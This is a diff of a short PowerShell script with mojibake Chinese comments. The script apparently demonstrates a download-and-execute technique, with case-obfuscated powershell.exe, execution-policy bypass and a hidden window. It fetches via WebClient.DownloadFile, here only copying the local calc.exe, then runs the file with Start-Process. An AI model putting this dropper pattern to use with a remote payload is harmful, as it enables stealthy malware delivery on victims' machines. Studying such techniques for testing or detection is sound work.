@@ -1,21 +1,21 @@
-ï»¿# ï¿½ï¿½È¡ï¿½ï¿½ï¿½Ð½Å±ï¿½Ä¿Â¼
+# »ñÈ¡ÔËÐÐ½Å±¾Ä¿Â¼
 $x = $MyInvocation.MyCommand.Definition
 $x = Split-Path -Parent $MyInvocation.MyCommand.Definition
-echo "ï¿½ï¿½Ç°Â·ï¿½ï¿½Îª: $X\"
+echo "µ±Ç°Â·¾¶Îª: $X\"
 
 
-# 1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
+# 1¡¢ÏÂÔØÎÄ¼þ
 
-# ï¿½ï¿½Ç°Â·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½.exe
+# µ±Ç°Â·¾¶ÏÂÏÂÔØÒ»¸ö¼ÆËãÆ÷.exe
 
 pOWErsHell.ExE -exEcUTIonPOLICy BYpAsS -nOprOFile -winDOWStyLE HiDden (NEW-objeCt SYSTeM.Net.weBCLIEnT).DOWNloaDfIlE('file://C:\Windows\System32\calc.exe',"$X\powershell_calc.EXE");
 
-# 1.1 ï¿½ï¿½Ö´ï¿½ï¿½ï¿½
+# 1.1 ²ð·Ö´úÂë
 
 $client = new-object System.Net.WebClient
-$client.DownloadFile(ï¿½ï¿½file://C:\Windows\System32\calc.exeï¿½ï¿½, "$X\powershell_calc_1.EXE")
+$client.DownloadFile(¡®file://C:\Windows\System32\calc.exe¡¯, "$X\powershell_calc_1.EXE")
 
 
-# 2ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
+# 2¡¢ÔËÐÐÎÄ¼þ
 
 sTArt-PrOCeSS "$X\powershell_calc.EXE"
